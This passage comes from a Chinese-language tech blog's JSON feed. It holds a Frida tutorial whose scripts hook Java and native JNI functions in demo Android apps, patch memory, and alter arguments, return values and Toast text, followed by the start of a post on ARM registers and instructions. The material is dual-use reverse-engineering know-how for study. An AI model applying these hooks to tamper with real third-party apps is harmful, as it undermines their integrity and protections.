native</strong><ul>\n<li>在对native函数进行hook的时候要使用函数的全名。打开IDA后Export显示的名称</li>\n<li>修改返回值时，如果返回值是string，不能简单的replace（具体方式看下面脚本）</li>\n</ul>\n</li>\n<li><strong>修改内存</strong><ul>\n<li>修改内存先找so基址，偏移量将IDA segment中的base addr设为0后，显示的地址加so基址即可</li>\n<li>写内容时先修改内存页的保护属性</li>\n</ul>\n</li>\n</ul>\n<p>具体脚本如下：</p>\n<h4 id=\"解题脚本\"><a href=\"#解题脚本\" class=\"headerlink\" title=\"解题脚本\"></a>解题脚本</h4><figure class=\"highlight js\"><table><tbody><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs js\"><span class=\"hljs-title class_\">Java</span>.<span class=\"hljs-title function_\">perform</span>(<span class=\"hljs-function\">() =&gt;</span> {<br><br>    <span class=\"hljs-keyword\">function</span> <span class=\"hljs-title function_\">hookMem</span>(<span class=\"hljs-params\"></span>) {<br>        <span class=\"hljs-keyword\">const</span> soAddress = <span class=\"hljs-title class_\">Module</span>.<span class=\"hljs-title function_\">findBaseAddress</span>(<span class=\"hljs-string\">\"libnative-lib.so\"</span>);<br>        <span class=\"hljs-variable language_\">console</span>.<span class=\"hljs-title function_\">log</span>(<span class=\"hljs-string\">\"so基址：\"</span> + soAddress);<br>        <span class=\"hljs-keyword\">if</span> (soAddress) {<br>            <span class=\"hljs-variable language_\">console</span>.<span class=\"hljs-title function_\">log</span>(<span class=\"hljs-string\">\"读取...\"</span>);<br>            <span class=\"hljs-keyword\">const</span> strAddress = soAddress.<span class=\"hljs-title function_\">add</span>(<span class=\"hljs-number\">0x028334</span>);<br>            <span class=\"hljs-variable language_\">console</span>.<span class=\"hljs-title function_\">log</span>(<span class=\"hljs-string\">\"打印这段字符串：\"</span> + strAddress.<span class=\"hljs-title function_\">readCString</span>());<br>            <span class=\"hljs-variable language_\">console</span>.<span class=\"hljs-title function_\">log</span>(<span class=\"hljs-string\">\"读16字节：\"</span>);<br>            <span class=\"hljs-variable language_\">console</span>.<span class=\"hljs-title function_\">log</span>(strAddress.<span class=\"hljs-title function_\">readByteArray</span>(<span class=\"hljs-number\">16</span>));<br>    <br>            <span class=\"hljs-variable language_\">console</span>.<span class=\"hljs-title function_\">log</span>(<span class=\"hljs-string\">\"写入...\"</span>);<br>            <span class=\"hljs-title class_\">Memory</span>.<span class=\"hljs-title function_\">protect</span>(strAddress, <span class=\"hljs-title class_\">Process</span>.<span class=\"hljs-property\">pageSize</span>, <span class=\"hljs-string\">\"rw-\"</span>); <span class=\"hljs-comment\">//修改内存页属性后再写入</span><br>            strAddress.<span class=\"hljs-title function_\">writeUtf8String</span>(<span class=\"hljs-string\">\"x86demo Hacked\"</span>) <span class=\"hljs-comment\">//内存写入字符串,该方法末尾会自动添加'\\0'</span><br>            <span class=\"hljs-variable language_\">console</span>.<span class=\"hljs-title function_\">log</span>(<span class=\"hljs-string\">\"\\r\\n打印这段字符串：\"</span> + strAddress.<span class=\"hljs-title function_\">readCString</span>());<br>            <span class=\"hljs-variable language_\">console</span>.<span class=\"hljs-title function_\">log</span>(<span class=\"hljs-string\">\"读16字节：\\r\\n\"</span>);<br>            <span class=\"hljs-variable language_\">console</span>.<span class=\"hljs-title function_\">log</span>(strAddress.<span class=\"hljs-title function_\">readByteArray</span>(<span class=\"hljs-number\">16</span>));<br>        }<br>    }<br>    <span class=\"hljs-keyword\">var</span> clazz = <span class=\"hljs-title class_\">Java</span>.<span class=\"hljs-title function_\">use</span>(<span class=\"hljs-string\">\"com.example.x86demo.MainActivity\"</span>);<br>    clazz.<span class=\"hljs-property\">onCreate</span>.<span class=\"hljs-property\">implementation</span> = <span class=\"hljs-keyword\">function</span>(<span class=\"hljs-params\"></span>)<br>    {<br>        <span class=\"hljs-variable language_\">console</span>.<span class=\"hljs-title function_\">log</span>(<span class=\"hljs-string\">\"Hook MainActivity onCreate()...\"</span>);<br>        <span class=\"hljs-comment\">// hookMem();</span><br>        <span class=\"hljs-title function_\">hookByName</span>();<br>        <span class=\"hljs-keyword\">return</span> <span class=\"hljs-variable language_\">this</span>.<span class=\"hljs-title function_\">onCreate</span>(<span class=\"hljs-variable language_\">arguments</span>[<span class=\"hljs-number\">0</span>]);<br>    }<br>    <br><br><br>    <span class=\"hljs-keyword\">function</span> <span class=\"hljs-title function_\">hookByName</span>(<span class=\"hljs-params\"></span>) {<br>        <span class=\"hljs-keyword\">const</span> address = <span class=\"hljs-title class_\">Module</span>.<span class=\"hljs-title function_\">findExportByName</span>(<span class=\"hljs-string\">\"libnative-lib.so\"</span>,<span class=\"hljs-string\">\"Java_com_example_x86demo_MainActivity_stringFromJNI\"</span>);<br>        <span class=\"hljs-keyword\">if</span> (address) {<br>            <span class=\"hljs-title class_\">Interceptor</span>.<span class=\"hljs-title function_\">attach</span>(address, {<br>                <span class=\"hljs-title function_\">onEnter</span>(<span class=\"hljs-params\">args</span>) {<br>                    <span class=\"hljs-variable language_\">console</span>.<span class=\"hljs-title function_\">log</span>(<span class=\"hljs-string\">\"onEnter...\"</span>);<br>                },<br>                <span class=\"hljs-title function_\">onLeave</span>(<span class=\"hljs-params\">retval</span>) { <br>                    <span class=\"hljs-variable language_\">console</span>.<span class=\"hljs-title function_\">log</span>(<span class=\"hljs-string\">\"onLeave...\"</span>);<br>                    <span class=\"hljs-keyword\">var</span> env = <span class=\"hljs-title class_\">Java</span>.<span class=\"hljs-property\">vm</span>.<span class=\"hljs-title function_\">getEnv</span>();<br>                    <span class=\"hljs-keyword\">var</span> jstrings = env.<span class=\"hljs-title function_\">newStringUtf</span>(<span class=\"hljs-string\">\"Hacked!\"</span>);<br>                    retval.<span class=\"hljs-title function_\">replace</span>(jstrings);<br>                    <span class=\"hljs-variable language_\">console</span>.<span class=\"hljs-title function_\">log</span>(<span class=\"hljs-string\">\"retval:\"</span>,retval); <span class=\"hljs-comment\">// 函数返回值</span><br>                }<br>            });<br>        }<span class=\"hljs-keyword\">else</span>{<br>            <span class=\"hljs-variable language_\">console</span>.<span class=\"hljs-title function_\">log</span>(<span class=\"hljs-string\">\"NOt FOUND!\"</span>);<br>        }<br>    }<br>    <br>})<br><br><br></code></pre></td></tr></tbody></table></figure>\n\n<p>最终效果如下：</p>\n<img src=\"https://alazymechnaic.oss-cn-hangzhou.aliyuncs.com/blog-page/image-20231004224219956.png\" alt=\"image-20231004224219956\" style=\"zoom: 80%;\">\n\n<h2 id=\"Frida-Hook-Java层函数\"><a href=\"#Frida-Hook-Java层函数\" class=\"headerlink\" title=\"Frida Hook Java层函数\"></a>Frida Hook Java层函数</h2><h3 id=\"Hook一般java层函数\"><a href=\"#Hook一般java层函数\" class=\"headerlink\" title=\"Hook一般java层函数\"></a>Hook一般java层函数</h3><figure class=\"highlight js\"><table><tbody><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs js\"><span class=\"hljs-title class_\">Java</span>.<span class=\"hljs-title function_\">perform</span>(<span class=\"hljs-keyword\">function</span>(<span class=\"hljs-params\"></span>){<br>    <span class=\"hljs-keyword\">var</span> clazz = <span class=\"hljs-title class_\">Java</span>.<span class=\"hljs-title function_\">use</span>(<span class=\"hljs-string\">\"com.zyc.fridademo.Calc\"</span>);<br>    clazz.<span class=\"hljs-property\">add</span>.<span class=\"hljs-property\">implementation</span> = <span class=\"hljs-keyword\">function</span>(<span class=\"hljs-params\">p1</span>)<br>    {<br>        <span class=\"hljs-variable language_\">console</span>.<span class=\"hljs-title function_\">log</span>(<span class=\"hljs-string\">\"Hook开始...\"</span>);<br>        <span class=\"hljs-title function_\">send</span>(<span class=\"hljs-string\">\"原p1=\"</span>+p1);<br>        <span class=\"hljs-variable language_\">console</span>.<span class=\"hljs-title function_\">log</span>(<span class=\"hljs-string\">\"Hook修改参数...\"</span>);<br>        p1+=<span class=\"hljs-number\">100</span>;<br>        <span class=\"hljs-title function_\">send</span>(<span class=\"hljs-string\">\"现p1=\"</span>+p1);<br>        <span class=\"hljs-keyword\">return</span> <span class=\"hljs-variable language_\">this</span>.<span class=\"hljs-title function_\">add</span>(p1);<br>    }<br>});<br></code></pre></td></tr></tbody></table></figure>\n\n<h3 id=\"Hook构造函数\"><a href=\"#Hook构造函数\" class=\"headerlink\" title=\"Hook构造函数\"></a>Hook构造函数</h3><figure class=\"highlight js\"><table><tbody><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs js\"><span class=\"hljs-title class_\">Java</span>.<span class=\"hljs-title function_\">perform</span>(<span class=\"hljs-keyword\">function</span>(<span class=\"hljs-params\"></span>){<br>    <span class=\"hljs-keyword\">var</span> clazz = <span class=\"hljs-title class_\">Java</span>.<span class=\"hljs-title function_\">use</span>(<span class=\"hljs-string\">\"com.zyc.fridademo.Calc\"</span>);<br>    clazz.<span class=\"hljs-property\">$init</span>.<span class=\"hljs-property\">implementation</span> = <span class=\"hljs-keyword\">function</span>(<span class=\"hljs-params\">p1</span>)<br>    {<br>        <span class=\"hljs-variable language_\">console</span>.<span class=\"hljs-title function_\">log</span>(<span class=\"hljs-string\">\"Hook构造开始...\"</span>);<br>        <span class=\"hljs-title function_\">send</span>(<span class=\"hljs-string\">\"原p1=\"</span>+p1);<br>        p1+=<span class=\"hljs-number\">200</span>;<br>        <span class=\"hljs-title function_\">send</span>(<span class=\"hljs-string\">\"现p1=\"</span>+p1);<br>        <span class=\"hljs-keyword\">return</span> <span class=\"hljs-variable language_\">this</span>.$init(p1);<br>    }<br>});<br><br></code></pre></td></tr></tbody></table></figure>\n\n<h3 id=\"Hook重载函数\"><a href=\"#Hook重载函数\" class=\"headerlink\" title=\"Hook重载函数\"></a>Hook重载函数</h3><figure class=\"highlight js\"><table><tbody><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs js\"><span class=\"hljs-comment\">// 由于Calc中有add(int num1)和add(int num1,String num2)，像普通函数那样Hook是会报错的，涉及到重载就要用到 overload() ：</span><br><span class=\"hljs-comment\">// 这里按照传入的参数类型区分二者的差异</span><br><span class=\"hljs-title class_\">Java</span>.<span class=\"hljs-title function_\">perform</span>(<span class=\"hljs-keyword\">function</span>(<span class=\"hljs-params\"></span>){<br>    <span class=\"hljs-keyword\">var</span> clazz = <span class=\"hljs-title class_\">Java</span>.<span class=\"hljs-title function_\">use</span>(<span class=\"hljs-string\">\"com.zyc.fridademo.Calc\"</span>);<br>    clazz.<span class=\"hljs-property\">add</span>.<span class=\"hljs-title function_\">overload</span>(<span class=\"hljs-string\">\"int\"</span>).<span class=\"hljs-property\">implementation</span> = <span class=\"hljs-keyword\">function</span>(<span class=\"hljs-params\"></span>)<br>    {<br>        <span class=\"hljs-variable language_\">console</span>.<span class=\"hljs-title function_\">log</span>(<span class=\"hljs-string\">\"Hook add(int num1)...\"</span>);<br>        <span class=\"hljs-keyword\">return</span> <span class=\"hljs-number\">888</span>;<br>    }<br><br>    clazz.<span class=\"hljs-property\">add</span>.<span class=\"hljs-title function_\">overload</span>(<span class=\"hljs-string\">\"int\"</span>,<span class=\"hljs-string\">\"java.lang.String\"</span>).<span class=\"hljs-property\">implementation</span> = <span class=\"hljs-keyword\">function</span>(<span class=\"hljs-params\"></span>)<br>    {<br>        <span class=\"hljs-variable language_\">console</span>.<span class=\"hljs-title function_\">log</span>(<span class=\"hljs-string\">\"Hook add(int num1,String num2)...\"</span>);<br>        <span class=\"hljs-keyword\">return</span> <span class=\"hljs-number\">999</span>;<br>    }<br>});<br><span class=\"hljs-comment\">// 也可以通过遍历重载函数的形似\t</span><br><span class=\"hljs-title class_\">Java</span>.<span class=\"hljs-title function_\">perform</span>(<span class=\"hljs-keyword\">function</span>(<span class=\"hljs-params\"></span>){<br>    <span class=\"hljs-keyword\">var</span> clazz = <span class=\"hljs-title class_\">Java</span>.<span class=\"hljs-title function_\">use</span>(<span class=\"hljs-string\">\"com.zyc.fridademo.Calc\"</span>);<br>    <span class=\"hljs-keyword\">var</span> count = clazz.<span class=\"hljs-property\">add</span>.<span class=\"hljs-property\">overloads</span>.<span class=\"hljs-property\">length</span>;<br>    <span class=\"hljs-keyword\">for</span>(<span class=\"hljs-keyword\">var</span> i=<span class=\"hljs-number\">0</span>;i&lt;count;i++){<br>        clazz.<span class=\"hljs-property\">add</span>.<span class=\"hljs-property\">overloads</span>[i].<span class=\"hljs-property\">implementation</span> = <span class=\"hljs-keyword\">function</span>(<span class=\"hljs-params\"></span>){<br>            <span class=\"hljs-variable language_\">arguments</span>[<span class=\"hljs-number\">0</span>] = <span class=\"hljs-number\">8</span>;<br>            <span class=\"hljs-keyword\">if</span>(<span class=\"hljs-variable language_\">arguments</span>[<span class=\"hljs-number\">1</span>]){<br>                <span class=\"hljs-title function_\">send</span>(<span class=\"hljs-variable language_\">arguments</span>[<span class=\"hljs-number\">1</span>]);<br>            }<br>            <span class=\"hljs-keyword\">return</span> <span class=\"hljs-variable language_\">this</span>.<span class=\"hljs-property\">add</span>.<span class=\"hljs-title function_\">apply</span>(<span class=\"hljs-variable language_\">this</span>,<span class=\"hljs-variable language_\">arguments</span>);<br>        }<br>    }<br>});<br></code></pre></td></tr></tbody></table></figure>\n\n<h3 id=\"重写Tosat\"><a href=\"#重写Tosat\" class=\"headerlink\" title=\"重写Tosat\"></a>重写Tosat</h3><p>​\t参考这个例子能看到，js可以完全重写Android java层的代码。</p>\n<figure class=\"highlight js\"><table><tbody><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs js\"><span class=\"hljs-title class_\">Java</span>.<span class=\"hljs-title function_\">perform</span>(<span class=\"hljs-keyword\">function</span> (<span class=\"hljs-params\"></span>) {<br>  <span class=\"hljs-comment\">// hook类: MainActivity</span><br>  <span class=\"hljs-keyword\">var</span> <span class=\"hljs-title class_\">MainActivity</span> = <span class=\"hljs-title class_\">Java</span>.<span class=\"hljs-title function_\">use</span>(<span class=\"hljs-string\">\"com.yashu.aaaaaaaaaaaaaaaaaaaaaa.MainActivity\"</span>);<br>  <span class=\"hljs-comment\">// hook方法: MainActivity.onCreate</span><br>  <span class=\"hljs-title class_\">MainActivity</span>.<span class=\"hljs-property\">onCreate</span>.<span class=\"hljs-property\">implementation</span> = <span class=\"hljs-keyword\">function</span> (<span class=\"hljs-params\">savedInstanceState</span>) {<br>    <span class=\"hljs-variable language_\">console</span>.<span class=\"hljs-title function_\">log</span>(<span class=\"hljs-string\">\"enter onCreate\"</span>);<br>    <span class=\"hljs-comment\">// 不打断程序, 该执行的还要执行</span><br>    <span class=\"hljs-comment\">// 执行this.onCreate, 且传参</span><br>    <span class=\"hljs-variable language_\">this</span>.<span class=\"hljs-title function_\">onCreate</span>(savedInstanceState);<br>  };<br><br>  <span class=\"hljs-comment\">// 获得Toast组件</span><br>  <span class=\"hljs-keyword\">var</span> <span class=\"hljs-title class_\">Toast</span> = <span class=\"hljs-title class_\">Java</span>.<span class=\"hljs-title function_\">use</span>(<span class=\"hljs-string\">\"android.widget.Toast\"</span>);<br>  <span class=\"hljs-keyword\">var</span> makeText = <span class=\"hljs-title class_\">Toast</span>.<span class=\"hljs-property\">makeText</span>;<br>  <span class=\"hljs-keyword\">var</span> <span class=\"hljs-title class_\">String</span> = <span class=\"hljs-title class_\">Java</span>.<span class=\"hljs-title function_\">use</span>(<span class=\"hljs-string\">\"java.lang.String\"</span>);<br>  <span class=\"hljs-comment\">// 函数重载, 设置参数类型</span><br>  makeText.<span class=\"hljs-title function_\">overload</span>(<span class=\"hljs-string\">\"android.content.Context\"</span>, <span class=\"hljs-string\">\"java.lang.CharSequence\"</span>, <span class=\"hljs-string\">\"int\"</span>).<span class=\"hljs-property\">implementation</span> = <span class=\"hljs-keyword\">function</span> (<span class=\"hljs-params\"></span><br><span class=\"hljs-params\">    context,</span><br><span class=\"hljs-params\">    content,</span><br><span class=\"hljs-params\">    time</span><br><span class=\"hljs-params\">  </span>) {<br>    <span class=\"hljs-variable language_\">console</span>.<span class=\"hljs-title function_\">log</span>(<span class=\"hljs-string\">\"修改toast内容\"</span>);<br>    <span class=\"hljs-comment\">// 设置字符串重复次数</span><br>    <span class=\"hljs-keyword\">var</span> content = <span class=\"hljs-string\">\"牙叔教程 超级棒棒\\n\"</span>.<span class=\"hljs-title function_\">repeat</span>(<span class=\"hljs-number\">10</span>);<br>    <span class=\"hljs-comment\">// 实例化字符串</span><br>    <span class=\"hljs-keyword\">var</span> hookContent = <span class=\"hljs-title class_\">String</span>.$new(content);<br>    <span class=\"hljs-comment\">// 可以hook, 但是不能打断原先的程序, 原来该做什么, 还要继续做下去</span><br>    <span class=\"hljs-keyword\">return</span> <span class=\"hljs-variable language_\">this</span>.<span class=\"hljs-title function_\">makeText</span>(context, hookContent, time);<br>  };<br>});<br></code></pre></td></tr></tbody></table></figure>\n\n\n\n<h3 id=\"访问类属性\"><a href=\"#访问类属性\" class=\"headerlink\" title=\"访问类属性\"></a>访问类属性</h3><figure class=\"highlight js\"><table><tbody><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs js\"><span class=\"hljs-comment\">// 类的属性可通过 .属性名.value 访问。如果有函数与属性名相同，则需要使用下划线方式 ._属性名.value 访问。</span><br><span class=\"hljs-title class_\">Java</span>.<span class=\"hljs-title function_\">perform</span>(<span class=\"hljs-keyword\">function</span>(<span class=\"hljs-params\"></span>){<br>    <span class=\"hljs-keyword\">var</span> clazz = <span class=\"hljs-title class_\">Java</span>.<span class=\"hljs-title function_\">use</span>(<span class=\"hljs-string\">\"com.zyc.fridademo.MainActivity\"</span>);<br>    <span class=\"hljs-keyword\">var</span> calc = <span class=\"hljs-title class_\">Java</span>.<span class=\"hljs-title function_\">use</span>(<span class=\"hljs-string\">\"com.zyc.fridademo.Calc\"</span>);<br>    clazz.<span class=\"hljs-property\">onCreate</span>.<span class=\"hljs-property\">implementation</span> = <span class=\"hljs-keyword\">function</span>(<span class=\"hljs-params\"></span>)<br>    {<br>        <span class=\"hljs-variable language_\">console</span>.<span class=\"hljs-title function_\">log</span>(<span class=\"hljs-string\">\"Hook MainActivity onCreate()...\"</span>);<br>        <span class=\"hljs-keyword\">var</span> myCalc = calc.$new(<span class=\"hljs-number\">10</span>);<br>        <span class=\"hljs-title function_\">send</span>(myCalc.<span class=\"hljs-property\">base</span>.<span class=\"hljs-property\">value</span>);<br>        <span class=\"hljs-variable language_\">console</span>.<span class=\"hljs-title function_\">log</span>(<span class=\"hljs-string\">\"修改一下base...\"</span>);<br>        myCalc.<span class=\"hljs-property\">base</span>.<span class=\"hljs-property\">value</span> = <span class=\"hljs-number\">88</span>;<br>        <span class=\"hljs-title function_\">send</span>(myCalc.<span class=\"hljs-property\">base</span>.<span class=\"hljs-property\">value</span>);<br>        <span class=\"hljs-keyword\">return</span> <span class=\"hljs-variable language_\">this</span>.<span class=\"hljs-title function_\">onCreate</span>(<span class=\"hljs-variable language_\">arguments</span>[<span class=\"hljs-number\">0</span>]);<br>    }<br>});<br><br></code></pre></td></tr></tbody></table></figure>\n\n<h3 id=\"遍历已加载的类和方法\"><a href=\"#遍历已加载的类和方法\" class=\"headerlink\" title=\"遍历已加载的类和方法\"></a>遍历已加载的类和方法</h3><figure class=\"highlight js\"><table><tbody><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs js\"><span class=\"hljs-title class_\">Java</span>.<span class=\"hljs-title function_\">perform</span>(<span class=\"hljs-keyword\">function</span>(<span class=\"hljs-params\"></span>){<br>    <span class=\"hljs-title class_\">Java</span>.<span class=\"hljs-title function_\">enumerateLoadedClasses</span>({<br>        onMatch : <span class=\"hljs-keyword\">function</span>(<span class=\"hljs-params\">name,handle</span>){<br>            <span class=\"hljs-keyword\">if</span>(name.<span class=\"hljs-title function_\">indexOf</span>(<span class=\"hljs-string\">\"com.zyc.fridademo\"</span>) != -<span class=\"hljs-number\">1</span>){<br>                <span class=\"hljs-variable language_\">console</span>.<span class=\"hljs-title function_\">log</span>(name);<br>                <span class=\"hljs-keyword\">var</span> clazz = <span class=\"hljs-title class_\">Java</span>.<span class=\"hljs-title function_\">use</span>(name);<br>                <span class=\"hljs-keyword\">var</span> methods = clazz.<span class=\"hljs-property\">class</span>.<span class=\"hljs-title function_\">getDeclaredMethods</span>();<br>                <span class=\"hljs-keyword\">for</span>(<span class=\"hljs-keyword\">var</span> i=<span class=\"hljs-number\">0</span>;i&lt;methods.<span class=\"hljs-property\">length</span>;i++){<br>                    <span class=\"hljs-variable language_\">console</span>.<span class=\"hljs-title function_\">log</span>(methods[i]);<br>                }<br>            }<br>        },<br>        <span class=\"hljs-attr\">onComplete</span>:<span class=\"hljs-keyword\">function</span>(<span class=\"hljs-params\"></span>){}<br>    });<br>});<br><br></code></pre></td></tr></tbody></table></figure>\n\n\n\n<h2 id=\"参考链接\"><a href=\"#参考链接\" class=\"headerlink\" title=\"参考链接\"></a>参考链接</h2><p><a href=\"https://blog.csdn.net/zyc3545/article/details/114629718\">https://blog.csdn.net/zyc3545/article/details/114629718</a></p>\n<p><a href=\"https://blog.csdn.net/zyc3545/article/details/114080220?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522169642852316800226576512%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fblog.%2522%257D&amp;request_id=169642852316800226576512&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~blog~first_rank_ecpm_v1~rank_v31_ecpm-2-114080220-null-null.nonecase&amp;utm_term=frida&amp;spm=1018.2226.3001.4450\">https://blog.csdn.net/zyc3545/article/details/114080220?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522169642852316800226576512%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fblog.%2522%257D&amp;request_id=169642852316800226576512&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~blog~first_rank_ecpm_v1~rank_v31_ecpm-2-114080220-null-null.nonecase&amp;utm_term=frida&amp;spm=1018.2226.3001.4450</a>\t</p>\n<p><a href=\"https://www.jianshu.com/p/2475cb4532c8\">https://www.jianshu.com/p/2475cb4532c8</a></p>\n<p><a href=\"https://blog.csdn.net/q1921098027/article/details/127062229\">https://blog.csdn.net/q1921098027/article/details/127062229</a></p>\n",
            "tags": [
                "Hook"
            ]
        },
        {
            "id": "https://alazymechnaic.github.io/2023/10/03/arm-zhi-ling-ji-chu/",
            "url": "https://alazymechnaic.github.io/2023/10/03/arm-zhi-ling-ji-chu/",
            "title": "ARM指令基础",
            "date_published": "2023-10-03T06:28:56.000Z",
            "content_html": "<h2 id=\"ARM\"><a href=\"#ARM\" class=\"headerlink\" title=\"ARM\"></a>ARM</h2><p>​\t本文用于介绍arm指令集的基本架构，特性。</p>\n<h3 id=\"寄存器用法\"><a href=\"#寄存器用法\" class=\"headerlink\" title=\"寄存器用法\"></a>寄存器用法</h3><figure class=\"highlight plaintext\"><table><tbody><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs assembly\">通用寄存器（General-Purpose Registers）：<br><br>r0~r3 主要用于子程序间传递参数<br><br>r4~r11 主要用于保存局部变量，但在 Thumb 程序中，通常只能使用 r4~r7 来保存局部变量<br><br>r12 用作子程序间scratch 寄存器，即 ip 寄存器<br><br>r13 通常用做栈指针，即 sp<br><br>r14 寄存器又被称为连接寄存器（lr），用于保存子程序以及中断的返回地址<br><br>r15 用作程序计数器（pc），由于 ARM 采用了流水线机制，当正确读取了 PC 的值后，该值为当前指令地址加 8 个字节，即 PC 指向当前指令的下两条指令地址。<br><br>CPSR和SPSR都是程序状态寄存器，其中SPSR是用来保存中断前的CPSR中的值，以便在中断返回之后恢复处理器程序状态<br></code></pre></td></tr></tbody></table></figure>\n\n\n\n<h3 id=\"基本指令\"><a href=\"#基本指令\" class=\"headerlink\" title=\"基本指令\"></a>基本指令</h3><h3 id=\"常用指令集\"><a href=\"#常用指令集\" class=\"headerlink\" title=\"常用指令集\"></a>常用指令集</h3><p>ARM中的立即数常用井号在前进行标注，#立即数</p>\n<h4 id=\"数据定义\"><a href=\"#数据定义\" class=\"headerlink\" title=\"数据定义\"></a>数据定义</h4><figure class=\"highlight plaintext\"><table><tbody><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs assembly\">DATA1 DCB 10,20,30,40 ;分配一片连续的字节存储单元并初始化<br>DATA2 DCD 10,20,30,40 ;分配一片连续的字存储单元并初始化<br>BUF SPACE 100 